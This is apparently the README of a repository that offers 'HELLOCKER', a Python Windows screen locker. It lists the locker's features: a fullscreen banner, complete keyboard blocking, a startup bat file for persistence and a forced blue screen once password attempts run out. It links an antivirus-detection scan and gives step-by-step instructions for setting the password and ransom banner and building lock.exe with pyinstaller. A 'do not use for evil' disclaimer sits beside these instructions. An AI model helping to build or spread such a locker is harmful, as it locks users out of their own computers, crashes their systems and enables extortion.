# HELLOCKER
Winlocker on python


HELLOCKER
Winlocker written in Python.
DO NOT USE FOR EVIL PURPOSES!

Functional:

1.Banner in full screen on top of all windows

2. Complete blocking of the keyboard (the password is entered by clicking on the graphic buttons)

3. Creating a bat file to add to startup

4. Call bsod when password attempts expire

detections: https://antiscan.me/scan/new/result?id=eX4wBllAyEW2




Using:

1.Open the lock.py file in your code editor

2. Find the variables at the very beginning:
password, lock_text and count.

3. In password, instead of "123" in quotes, enter the password from numbers.

4. In lock_text in quotes, enter the banner text

5. In count, enter the number of attempts to enter the password, without quotes.

6. Open a command line, go to the folder with the repository, write

pip install -r requriments.txt

then

pyinstaller lock.py

go to the new dist folder then lock and find the lock.exe file there. This is your build.
